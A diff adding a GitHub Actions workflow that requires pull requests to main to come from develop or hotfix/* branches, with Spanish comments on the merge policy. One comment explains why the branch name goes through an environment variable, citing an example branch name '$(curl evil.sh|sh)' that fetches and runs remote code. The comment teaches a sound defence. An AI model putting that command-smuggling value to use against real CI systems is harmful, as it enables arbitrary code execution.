@@ -1,0 +1,36 @@
+name: Validate PR source
+
+# main es lo que se despliega y el flujo acordado es que todo pase por develop primero. La
+# excepción son las hotfix/*: un arreglo urgente en producción no puede esperar a que todo lo que
+# haya en develop esté listo para salir — pero un hotfix mergeado acá NO vuelve solo a develop, hay
+# que mergearlo también ahí o el próximo despliegue lo pisa.
+on:
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  validate-source:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Ensure PR comes from develop or a hotfix branch
+        # La rama de origen viaja por env, no interpolada en el `run:`: head_ref es texto que
+        # elige quien abre el PR, y pegado directo en el shell es ejecución de código arbitraria
+        # (alcanza con nombrar la rama "$(curl evil.sh|sh)" para que corra al validar el PR).
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+        run: |
+          case "$HEAD_REF" in
+            develop)
+              echo "PRs to main must come from develop or hotfix/*. Got: develop. OK."
+              ;;
+            hotfix/*)
+              echo "PRs to main must come from develop or hotfix/*. Got: $HEAD_REF. OK."
+              echo "::warning::Remember to also merge '$HEAD_REF' into develop — a hotfix that only lands on main gets overwritten by the next deploy."
+              ;;
+            *)
+              echo "::error::PRs to main must come from develop or hotfix/*. Got: $HEAD_REF."
+              exit 1
+              ;;
+          esac
